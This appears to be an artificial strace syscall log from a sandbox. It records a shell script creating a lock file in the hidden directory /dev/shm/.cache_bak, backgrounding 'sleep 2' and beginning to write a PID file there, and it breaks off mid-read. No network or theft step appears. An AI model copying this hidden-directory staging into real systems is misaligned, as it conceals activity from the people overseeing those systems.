9     14:56:49.150982 getegid()         = 1001
9     14:56:49.151297 getuid()          = 1001
9     14:56:49.151624 getgid()          = 1001
9     14:56:49.152068 access("/usr/bin/touch", R_OK) = 0
9     14:56:49.152585 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
9     14:56:49.153120 rt_sigprocmask(SIG_BLOCK, [INT TERM CHLD], [], 8) = 0
9     14:56:49.153627 clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0x79f014237e50) = 20
9     14:56:49.154270 rt_sigprocmask(SIG_SETMASK, [],  <unfinished ...>
20    14:56:49.154413 set_robust_list(0x79f014237e60, 24 <unfinished ...>
9     14:56:49.154686 <... rt_sigprocmask resumed>NULL, 8) = 0
20    14:56:49.154920 <... set_robust_list resumed>) = 0
9     14:56:49.155099 rt_sigprocmask(SIG_BLOCK, [CHLD],  <unfinished ...>
20    14:56:49.155275 getpid( <unfinished ...>
9     14:56:49.155454 <... rt_sigprocmask resumed>[], 8) = 0
20    14:56:49.155627 <... getpid resumed>) = 20
9     14:56:49.155817 rt_sigprocmask(SIG_SETMASK, [],  <unfinished ...>
20    14:56:49.155999 rt_sigprocmask(SIG_SETMASK, [],  <unfinished ...>
9     14:56:49.156167 <... rt_sigprocmask resumed>NULL, 8) = 0
20    14:56:49.156321 <... rt_sigprocmask resumed>NULL, 8) = 0
9     14:56:49.156475 rt_sigprocmask(SIG_BLOCK, [CHLD],  <unfinished ...>
20    14:56:49.156640 rt_sigaction(SIGTSTP, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x79f01427e330},  <unfinished ...>
9     14:56:49.156857 <... rt_sigprocmask resumed>[], 8) = 0
20    14:56:49.157158 <... rt_sigaction resumed>{sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x79f01427e330}, 8) = 0
9     14:56:49.157369 rt_sigaction(SIGINT, {sa_handler=0x63f00dda8750, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x79f01427e330},  <unfinished ...>
20    14:56:49.157545 rt_sigaction(SIGTTIN, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x79f01427e330},  <unfinished ...>
9     14:56:49.157737 <... rt_sigaction resumed>{sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x79f01427e330}, 8) = 0
20    14:56:49.157930 <... rt_sigaction resumed>{sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x79f01427e330}, 8) = 0
9     14:56:49.158110 wait4(-1,  <unfinished ...>
20    14:56:49.158283 rt_sigaction(SIGTTOU, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x79f01427e330}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x79f01427e330}, 8) = 0
20    14:56:49.158716 rt_sigaction(SIGINT, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x79f01427e330}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x79f01427e330}, 8) = 0
20    14:56:49.159106 rt_sigaction(SIGQUIT, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x79f01427e330}, {sa_handler=SIG_IGN, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x79f01427e330}, 8) = 0
20    14:56:49.159463 rt_sigaction(SIGCHLD, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x79f01427e330}, {sa_handler=0x63f00dda6230, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x79f01427e330}, 8) = 0
20    14:56:49.159858 execve("/usr/bin/touch", ["touch", "/dev/shm/.cache_bak/update.lock"], 0x63f037b0d640 /* 9 vars */) = 0
20    14:56:49.160710 brk(NULL)         = 0x5745dd6dc000
20    14:56:49.161189 mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7b2776118000
20    14:56:49.161570 openat(AT_FDCWD</sandbox>, "/lib/libfake_tracer.so", O_RDONLY|O_CLOEXEC) = 3</usr/lib/libfake_tracer.so>
20    14:56:49.162244 read(3</usr/lib/libfake_tracer.so>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
20    14:56:49.162720 fstat(3</usr/lib/libfake_tracer.so>, {st_mode=S_IFREG|0777, st_size=16376, ...}) = 0
20    14:56:49.163253 mmap(NULL, 19160, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/libfake_tracer.so>, 0) = 0x7b2776113000
20    14:56:49.163594 mmap(0x7b2776114000, 4096, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/libfake_tracer.so>, 0x1000) = 0x7b2776114000
20    14:56:49.163965 mmap(0x7b2776115000, 4096, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/libfake_tracer.so>, 0x2000) = 0x7b2776115000
20    14:56:49.164385 mmap(0x7b2776116000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/libfake_tracer.so>, 0x2000) = 0x7b2776116000
20    14:56:49.164743 close(3</usr/lib/libfake_tracer.so>) = 0
20    14:56:49.165082 access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
20    14:56:49.165423 openat(AT_FDCWD</sandbox>, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3</etc/ld.so.cache>
20    14:56:49.165793 fstat(3</etc/ld.so.cache>, {st_mode=S_IFREG|0644, st_size=7295, ...}) = 0
20    14:56:49.166132 mmap(NULL, 7295, PROT_READ, MAP_PRIVATE, 3</etc/ld.so.cache>, 0) = 0x7b2776111000
20    14:56:49.166470 close(3</etc/ld.so.cache>) = 0
20    14:56:49.166867 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libc.so.6>
20    14:56:49.167252 read(3</usr/lib/x86_64-linux-gnu/libc.so.6>, "\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\220\243\2\0\0\0\0\0"..., 832) = 832
20    14:56:49.167588 pread64(3</usr/lib/x86_64-linux-gnu/libc.so.6>, "\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0"..., 784, 64) = 784
20    14:56:49.167922 fstat(3</usr/lib/x86_64-linux-gnu/libc.so.6>, {st_mode=S_IFREG|0755, st_size=2125328, ...}) = 0
20    14:56:49.168391 pread64(3</usr/lib/x86_64-linux-gnu/libc.so.6>, "\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0"..., 784, 64) = 784
20    14:56:49.168870 mmap(NULL, 2170256, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libc.so.6>, 0) = 0x7b2775eff000
20    14:56:49.169263 mmap(0x7b2775f27000, 1605632, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libc.so.6>, 0x28000) = 0x7b2775f27000
20    14:56:49.169670 mmap(0x7b27760af000, 323584, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libc.so.6>, 0x1b0000) = 0x7b27760af000
20    14:56:49.170031 mmap(0x7b27760fe000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libc.so.6>, 0x1fe000) = 0x7b27760fe000
20    14:56:49.170398 mmap(0x7b2776104000, 52624, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x7b2776104000
20    14:56:49.170778 close(3</usr/lib/x86_64-linux-gnu/libc.so.6>) = 0
20    14:56:49.171142 mmap(NULL, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7b2775efc000
20    14:56:49.171508 arch_prctl(ARCH_SET_FS, 0x7b2775efc740) = 0
20    14:56:49.171941 set_tid_address(0x7b2775efca10) = 20
20    14:56:49.172317 set_robust_list(0x7b2775efca20, 24) = 0
20    14:56:49.172637 rseq(0x7b2775efd060, 0x20, 0, 0x53053053) = 0
20    14:56:49.173045 mprotect(0x7b27760fe000, 16384, PROT_READ) = 0
20    14:56:49.173466 mprotect(0x7b2776116000, 4096, PROT_READ) = 0
20    14:56:49.173942 mprotect(0x5745b1b40000, 4096, PROT_READ) = 0
20    14:56:49.174376 mprotect(0x7b2776150000, 8192, PROT_READ) = 0
20    14:56:49.174860 prlimit64(0, RLIMIT_STACK, NULL, {rlim_cur=8192*1024, rlim_max=RLIM64_INFINITY}) = 0
20    14:56:49.175253 munmap(0x7b2776111000, 7295) = 0
20    14:56:49.175685 getrandom("\x5c\x34\xa7\x77\xaf\x2a\xca\xe6", 8, GRND_NONBLOCK) = 8
20    14:56:49.176017 brk(NULL)         = 0x5745dd6dc000
20    14:56:49.176334 brk(0x5745dd6fd000) = 0x5745dd6fd000
20    14:56:49.176712 openat(AT_FDCWD</sandbox>, "/dev/shm/.cache_bak/update.lock", O_WRONLY|O_CREAT|O_NOCTTY|O_NONBLOCK, 000) = 3</dev/shm/.cache_bak/update.lock>
20    14:56:49.177149 dup2(3</dev/shm/.cache_bak/update.lock>, 0<pipe:[589]>) = 0</dev/shm/.cache_bak/update.lock>
20    14:56:49.177517 close(3</dev/shm/.cache_bak/update.lock>) = 0
20    14:56:49.177850 utimensat(0</dev/shm/.cache_bak/update.lock>, NULL, NULL, 0) = 0
20    14:56:49.178177 close(0</dev/shm/.cache_bak/update.lock>) = 0
20    14:56:49.178532 close(1<pipe:[2809]>) = 0
20    14:56:49.178912 close(2<pipe:[2810]>) = 0
20    14:56:49.179254 exit_group(0)     = ?
20    14:56:49.179933 +++ exited with 0 +++
9     14:56:49.180096 <... wait4 resumed>[{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0, NULL) = 20
9     14:56:49.180281 rt_sigaction(SIGINT, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x79f01427e330}, {sa_handler=0x63f00dda8750, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x79f01427e330}, 8) = 0
9     14:56:49.180641 ioctl(2<pipe:[2810]>, TIOCGWINSZ, 0x7fff19398f90) = -1 ENOTTY (Inappropriate ioctl for device)
9     14:56:49.181070 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
9     14:56:49.181411 --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=20, si_uid=1001, si_status=0, si_utime=0, si_stime=0} ---
9     14:56:49.181583 wait4(-1, 0x7fff19398910, WNOHANG, NULL) = -1 ECHILD (No child processes)
9     14:56:49.181900 rt_sigreturn({mask=[]}) = 0
9     14:56:49.182231 read(0<pipe:[589]>, "\n", 1) = 1
9     14:56:49.182641 read(0<pipe:[589]>, " ", 1) = 1
9     14:56:49.182985 read(0<pipe:[589]>, " ", 1) = 1
9     14:56:49.183328 read(0<pipe:[589]>, " ", 1) = 1
9     14:56:49.183835 read(0<pipe:[589]>, " ", 1) = 1
9     14:56:49.184269 read(0<pipe:[589]>, "#", 1) = 1
9     14:56:49.184651 read(0<pipe:[589]>, " ", 1) = 1
9     14:56:49.185022 read(0<pipe:[589]>, "B", 1) = 1
9     14:56:49.185363 read(0<pipe:[589]>, "a", 1) = 1
9     14:56:49.185742 read(0<pipe:[589]>, "c", 1) = 1
9     14:56:49.186078 read(0<pipe:[589]>, "k", 1) = 1
9     14:56:49.186408 read(0<pipe:[589]>, "g", 1) = 1
9     14:56:49.186821 read(0<pipe:[589]>, "r", 1) = 1
9     14:56:49.187155 read(0<pipe:[589]>, "o", 1) = 1
9     14:56:49.187486 read(0<pipe:[589]>, "u", 1) = 1
9     14:56:49.187817 read(0<pipe:[589]>, "n", 1) = 1
9     14:56:49.188146 read(0<pipe:[589]>, "d", 1) = 1
9     14:56:49.188477 read(0<pipe:[589]>, " ", 1) = 1
9     14:56:49.188808 read(0<pipe:[589]>, "s", 1) = 1
9     14:56:49.189138 read(0<pipe:[589]>, "l", 1) = 1
9     14:56:49.189490 read(0<pipe:[589]>, "e", 1) = 1
9     14:56:49.189964 read(0<pipe:[589]>, "e", 1) = 1
9     14:56:49.190698 read(0<pipe:[589]>, "p", 1) = 1
9     14:56:49.191256 read(0<pipe:[589]>, ",", 1) = 1
9     14:56:49.191675 read(0<pipe:[589]>, " ", 1) = 1
9     14:56:49.192105 read(0<pipe:[589]>, "r", 1) = 1
9     14:56:49.192618 read(0<pipe:[589]>, "e", 1) = 1
9     14:56:49.193130 read(0<pipe:[589]>, "c", 1) = 1
9     14:56:49.193595 read(0<pipe:[589]>, "o", 1) = 1
9     14:56:49.194063 read(0<pipe:[589]>, "r", 1) = 1
9     14:56:49.194537 read(0<pipe:[589]>, "d", 1) = 1
9     14:56:49.194970 read(0<pipe:[589]>, " ", 1) = 1
9     14:56:49.195309 read(0<pipe:[589]>, "P", 1) = 1
9     14:56:49.195660 read(0<pipe:[589]>, "I", 1) = 1
9     14:56:49.195999 read(0<pipe:[589]>, "D", 1) = 1
9     14:56:49.196375 read(0<pipe:[589]>, "\n", 1) = 1
9     14:56:49.196960 read(0<pipe:[589]>, " ", 1) = 1
9     14:56:49.197432 read(0<pipe:[589]>, " ", 1) = 1
9     14:56:49.197892 read(0<pipe:[589]>, " ", 1) = 1
9     14:56:49.198292 read(0<pipe:[589]>, " ", 1) = 1
9     14:56:49.198791 read(0<pipe:[589]>, "s", 1) = 1
9     14:56:49.199220 read(0<pipe:[589]>, "l", 1) = 1
9     14:56:49.199714 read(0<pipe:[589]>, "e", 1) = 1
9     14:56:49.202870 read(0<pipe:[589]>, "e", 1) = 1
9     14:56:49.203397 read(0<pipe:[589]>, "p", 1) = 1
9     14:56:49.203762 read(0<pipe:[589]>, " ", 1) = 1
9     14:56:49.204104 read(0<pipe:[589]>, "2", 1) = 1
9     14:56:49.204442 read(0<pipe:[589]>, " ", 1) = 1
9     14:56:49.204781 read(0<pipe:[589]>, "&", 1) = 1
9     14:56:49.205117 read(0<pipe:[589]>, "\n", 1) = 1
9     14:56:49.205723 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
9     14:56:49.206071 rt_sigprocmask(SIG_BLOCK, [INT TERM CHLD], [], 8) = 0
9     14:56:49.206410 clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0x79f014237e50) = 21
9     14:56:49.207280 rt_sigprocmask(SIG_SETMASK, [],  <unfinished ...>
21    14:56:49.207506 set_robust_list(0x79f014237e60, 24 <unfinished ...>
9     14:56:49.207694 <... rt_sigprocmask resumed>NULL, 8) = 0
21    14:56:49.207871 <... set_robust_list resumed>) = 0
9     14:56:49.208069 rt_sigprocmask(SIG_BLOCK, [CHLD],  <unfinished ...>
21    14:56:49.208277 getpid( <unfinished ...>
9     14:56:49.208481 <... rt_sigprocmask resumed>[], 8) = 0
21    14:56:49.208680 <... getpid resumed>) = 21
9     14:56:49.208877 rt_sigprocmask(SIG_BLOCK, [CHLD],  <unfinished ...>
21    14:56:49.209054 rt_sigprocmask(SIG_SETMASK, [],  <unfinished ...>
9     14:56:49.209301 <... rt_sigprocmask resumed>[CHLD], 8) = 0
21    14:56:49.209489 <... rt_sigprocmask resumed>NULL, 8) = 0
9     14:56:49.209650 rt_sigprocmask(SIG_SETMASK, [CHLD],  <unfinished ...>
21    14:56:49.209846 rt_sigaction(SIGTSTP, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x79f01427e330},  <unfinished ...>
9     14:56:49.210041 <... rt_sigprocmask resumed>NULL, 8) = 0
21    14:56:49.210223 <... rt_sigaction resumed>{sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x79f01427e330}, 8) = 0
9     14:56:49.210407 rt_sigprocmask(SIG_BLOCK, [CHLD],  <unfinished ...>
21    14:56:49.210594 rt_sigaction(SIGTTIN, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x79f01427e330},  <unfinished ...>
9     14:56:49.210769 <... rt_sigprocmask resumed>[CHLD], 8) = 0
21    14:56:49.210965 <... rt_sigaction resumed>{sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x79f01427e330}, 8) = 0
9     14:56:49.211156 rt_sigprocmask(SIG_SETMASK, [CHLD],  <unfinished ...>
21    14:56:49.211355 rt_sigaction(SIGTTOU, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x79f01427e330},  <unfinished ...>
9     14:56:49.211541 <... rt_sigprocmask resumed>NULL, 8) = 0
21    14:56:49.211713 <... rt_sigaction resumed>{sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x79f01427e330}, 8) = 0
9     14:56:49.211906 rt_sigprocmask(SIG_BLOCK, [CHLD],  <unfinished ...>
21    14:56:49.212103 newfstatat(AT_FDCWD</sandbox>, ".",  <unfinished ...>
9     14:56:49.212324 <... rt_sigprocmask resumed>[CHLD], 8) = 0
21    14:56:49.212511 <... newfstatat resumed>{st_mode=S_IFDIR|0755, st_size=4096, ...}, 0) = 0
9     14:56:49.212705 rt_sigprocmask(SIG_SETMASK, [CHLD],  <unfinished ...>
21    14:56:49.212891 newfstatat(AT_FDCWD</sandbox>, "/usr/local/sbin/sleep",  <unfinished ...>
9     14:56:49.213081 <... rt_sigprocmask resumed>NULL, 8) = 0
21    14:56:49.213260 <... newfstatat resumed>0x7fff19398c50, 0) = -1 ENOENT (No such file or directory)
9     14:56:49.213444 rt_sigprocmask(SIG_SETMASK, [],  <unfinished ...>
21    14:56:49.213638 newfstatat(AT_FDCWD</sandbox>, "/usr/local/bin/sleep",  <unfinished ...>
9     14:56:49.213830 <... rt_sigprocmask resumed>NULL, 8) = 0
21    14:56:49.214013 <... newfstatat resumed>0x7fff19398c50, 0) = -1 ENOENT (No such file or directory)
9     14:56:49.214198 read(0<pipe:[589]>,  <unfinished ...>
21    14:56:49.214393 newfstatat(AT_FDCWD</sandbox>, "/usr/sbin/sleep",  <unfinished ...>
9     14:56:49.214726 <... read resumed>" ", 1) = 1
21    14:56:49.214950 <... newfstatat resumed>0x7fff19398c50, 0) = -1 ENOENT (No such file or directory)
9     14:56:49.215207 read(0<pipe:[589]>,  <unfinished ...>
21    14:56:49.215409 newfstatat(AT_FDCWD</sandbox>, "/usr/bin/sleep",  <unfinished ...>
9     14:56:49.215622 <... read resumed>" ", 1) = 1
21    14:56:49.215815 <... newfstatat resumed>{st_mode=S_IFREG|0755, st_size=35336, ...}, 0) = 0
9     14:56:49.216033 read(0<pipe:[589]>,  <unfinished ...>
21    14:56:49.216224 newfstatat(AT_FDCWD</sandbox>, "/usr/bin/sleep",  <unfinished ...>
9     14:56:49.216408 <... read resumed>" ", 1) = 1
21    14:56:49.216580 <... newfstatat resumed>{st_mode=S_IFREG|0755, st_size=35336, ...}, 0) = 0
9     14:56:49.216760 read(0<pipe:[589]>,  <unfinished ...>
21    14:56:49.216940 geteuid( <unfinished ...>
9     14:56:49.217129 <... read resumed>" ", 1) = 1
21    14:56:49.217332 <... geteuid resumed>) = 1001
9     14:56:49.217512 read(0<pipe:[589]>,  <unfinished ...>
21    14:56:49.217689 getegid( <unfinished ...>
9     14:56:49.217857 <... read resumed>"e", 1) = 1
21    14:56:49.218034 <... getegid resumed>) = 1001
9     14:56:49.218203 read(0<pipe:[589]>,  <unfinished ...>
21    14:56:49.218365 getuid( <unfinished ...>
9     14:56:49.218528 <... read resumed>"c", 1) = 1
21    14:56:49.218735 <... getuid resumed>) = 1001
9     14:56:49.218892 read(0<pipe:[589]>,  <unfinished ...>
21    14:56:49.219065 getgid( <unfinished ...>
9     14:56:49.219216 <... read resumed>"h", 1) = 1
21    14:56:49.219371 <... getgid resumed>) = 1001
9     14:56:49.219528 read(0<pipe:[589]>,  <unfinished ...>
21    14:56:49.219692 access("/usr/bin/sleep", X_OK <unfinished ...>
9     14:56:49.219852 <... read resumed>"o", 1) = 1
21    14:56:49.220032 <... access resumed>) = 0
9     14:56:49.220187 read(0<pipe:[589]>,  <unfinished ...>
21    14:56:49.220351 newfstatat(AT_FDCWD</sandbox>, "/usr/bin/sleep",  <unfinished ...>
9     14:56:49.220530 <... read resumed>" ", 1) = 1
21    14:56:49.220699 <... newfstatat resumed>{st_mode=S_IFREG|0755, st_size=35336, ...}, 0) = 0
9     14:56:49.220878 read(0<pipe:[589]>,  <unfinished ...>
21    14:56:49.221051 geteuid( <unfinished ...>
9     14:56:49.221220 <... read resumed>" ", 1) = 1
21    14:56:49.221386 <... geteuid resumed>) = 1001
9     14:56:49.221547 read(0<pipe:[589]>,  <unfinished ...>
21    14:56:49.221736 getegid( <unfinished ...>
9     14:56:49.221909 <... read resumed>">", 1) = 1
21    14:56:49.222082 <... getegid resumed>) = 1001
9     14:56:49.222248 read(0<pipe:[589]>,  <unfinished ...>
21    14:56:49.222422 getuid( <unfinished ...>
9     14:56:49.222634 <... read resumed>" ", 1) = 1
21    14:56:49.222830 <... getuid resumed>) = 1001
9     14:56:49.223004 read(0<pipe:[589]>,  <unfinished ...>
21    14:56:49.223202 getgid( <unfinished ...>
9     14:56:49.223409 <... read resumed>"/", 1) = 1
21    14:56:49.223662 <... getgid resumed>) = 1001
9     14:56:49.223877 read(0<pipe:[589]>,  <unfinished ...>
21    14:56:49.224964 access("/usr/bin/sleep", R_OK <unfinished ...>
9     14:56:49.225303 <... read resumed>"d", 1) = 1
21    14:56:49.225592 <... access resumed>) = 0
9     14:56:49.225800 read(0<pipe:[589]>,  <unfinished ...>
21    14:56:49.226016 rt_sigaction(SIGINT, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x79f01427e330},  <unfinished ...>
9     14:56:49.226258 <... read resumed>"e", 1) = 1
21    14:56:49.226508 <... rt_sigaction resumed>{sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x79f01427e330}, 8) = 0
9     14:56:49.226734 read(0<pipe:[589]>,  <unfinished ...>
21    14:56:49.226963 rt_sigaction(SIGQUIT, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x79f01427e330},  <unfinished ...>
9     14:56:49.227202 <... read resumed>"v", 1) = 1
21    14:56:49.227399 <... rt_sigaction resumed>{sa_handler=SIG_IGN, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x79f01427e330}, 8) = 0
9     14:56:49.227582 read(0<pipe:[589]>,  <unfinished ...>
21    14:56:49.227786 rt_sigaction(SIGCHLD, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x79f01427e330},  <unfinished ...>
9     14:56:49.227967 <... read resumed>"/", 1) = 1
21    14:56:49.228269 <... rt_sigaction resumed>{sa_handler=0x63f00dda6230, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x79f01427e330}, 8) = 0
9     14:56:49.228499 read(0<pipe:[589]>,  <unfinished ...>
21    14:56:49.228726 openat(AT_FDCWD</sandbox>, "/dev/null", O_RDONLY <unfinished ...>
9     14:56:49.228971 <... read resumed>"s", 1) = 1
21    14:56:49.229212 <... openat resumed>) = 3</dev/null>
9     14:56:49.229446 read(0<pipe:[589]>,  <unfinished ...>
21    14:56:49.229699 dup2(3</dev/null>, 0<pipe:[589]> <unfinished ...>
9     14:56:49.229915 <... read resumed>"h", 1) = 1
21    14:56:49.230130 <... dup2 resumed>) = 0</dev/null>
9     14:56:49.230310 read(0<pipe:[589]>,  <unfinished ...>
21    14:56:49.230492 close(3</dev/null> <unfinished ...>
9     14:56:49.230707 <... read resumed>"m", 1) = 1
21    14:56:49.230896 <... close resumed>) = 0
9     14:56:49.231067 read(0<pipe:[589]>,  <unfinished ...>
21    14:56:49.231255 rt_sigaction(SIGINT, {sa_handler=SIG_IGN, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x79f01427e330},  <unfinished ...>
9     14:56:49.231441 <... read resumed>"/", 1) = 1
21    14:56:49.231619 <... rt_sigaction resumed>{sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x79f01427e330}, 8) = 0
9     14:56:49.231802 read(0<pipe:[589]>,  <unfinished ...>
21    14:56:49.231987 rt_sigaction(SIGQUIT, {sa_handler=SIG_IGN, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x79f01427e330},  <unfinished ...>
9     14:56:49.232168 <... read resumed>".", 1) = 1
21    14:56:49.232347 <... rt_sigaction resumed>{sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x79f01427e330}, 8) = 0
9     14:56:49.232523 read(0<pipe:[589]>,  <unfinished ...>
21    14:56:49.232737 execve("/usr/bin/sleep", ["sleep", "2"], 0x63f037b0d640 /* 9 vars */ <unfinished ...>
9     14:56:49.232939 <... read resumed>"c", 1) = 1
9     14:56:49.233479 read(0<pipe:[589]>,  <unfinished ...>
21    14:56:49.233707 <... execve resumed>) = 0
9     14:56:49.233903 <... read resumed>"a", 1) = 1
21    14:56:49.234102 brk(NULL <unfinished ...>
9     14:56:49.234285 read(0<pipe:[589]>,  <unfinished ...>
21    14:56:49.234491 <... brk resumed>) = 0x624aae664000
9     14:56:49.234698 <... read resumed>"c", 1) = 1
21    14:56:49.234921 mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0 <unfinished ...>
9     14:56:49.235146 read(0<pipe:[589]>,  <unfinished ...>
21    14:56:49.235359 <... mmap resumed>) = 0x70a4e9f17000
9     14:56:49.235588 <... read resumed>"h", 1) = 1
21    14:56:49.235783 openat(AT_FDCWD</sandbox>, "/lib/libfake_tracer.so", O_RDONLY|O_CLOEXEC <unfinished ...>
9     14:56:49.236027 read(0<pipe:[589]>, "e", 1) = 1
9     14:56:49.236409 read(0<pipe:[589]>,  <unfinished ...>
21    14:56:49.236583 <... openat resumed>) = 3</usr/lib/libfake_tracer.so>
9     14:56:49.236812 <... read resumed>"_", 1) = 1
21    14:56:49.237011 read(3</usr/lib/libfake_tracer.so>,  <unfinished ...>
9     14:56:49.237204 read(0<pipe:[589]>,  <unfinished ...>
21    14:56:49.237413 <... read resumed>"\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
9     14:56:49.237606 <... read resumed>"b", 1) = 1
21    14:56:49.237786 fstat(3</usr/lib/libfake_tracer.so>,  <unfinished ...>
9     14:56:49.237966 read(0<pipe:[589]>, "a", 1) = 1
21    14:56:49.238328 <... fstat resumed>{st_mode=S_IFREG|0777, st_size=16376, ...}) = 0
9     14:56:49.238486 read(0<pipe:[589]>,  <unfinished ...>
21    14:56:49.238647 mmap(NULL, 19160, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/libfake_tracer.so>, 0 <unfinished ...>
9     14:56:49.238802 <... read resumed>"k", 1) = 1
21    14:56:49.238953 <... mmap resumed>) = 0x70a4e9f12000
9     14:56:49.239091 read(0<pipe:[589]>,  <unfinished ...>
21    14:56:49.239231 mmap(0x70a4e9f13000, 4096, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/libfake_tracer.so>, 0x1000 <unfinished ...>
9     14:56:49.239369 <... read resumed>"/", 1) = 1
21    14:56:49.239521 <... mmap resumed>) = 0x70a4e9f13000
9     14:56:49.239663 read(0<pipe:[589]>,  <unfinished ...>
21    14:56:49.239805 mmap(0x70a4e9f14000, 4096, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/libfake_tracer.so>, 0x2000 <unfinished ...>
9     14:56:49.239948 <... read resumed>"p", 1) = 1
21    14:56:49.240099 <... mmap resumed>) = 0x70a4e9f14000
9     14:56:49.240273 read(0<pipe:[589]>,  <unfinished ...>
21    14:56:49.240442 mmap(0x70a4e9f15000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/libfake_tracer.so>, 0x2000 <unfinished ...>
9     14:56:49.240582 <... read resumed>"r", 1) = 1
21    14:56:49.240749 <... mmap resumed>) = 0x70a4e9f15000
9     14:56:49.240916 read(0<pipe:[589]>,  <unfinished ...>
21    14:56:49.241129 close(3</usr/lib/libfake_tracer.so> <unfinished ...>
9     14:56:49.241302 <... read resumed>"o", 1) = 1
21    14:56:49.241467 <... close resumed>) = 0
9     14:56:49.241618 read(0<pipe:[589]>,  <unfinished ...>
21    14:56:49.241773 access("/etc/ld.so.preload", R_OK <unfinished ...>
9     14:56:49.241929 <... read resumed>"c", 1) = 1
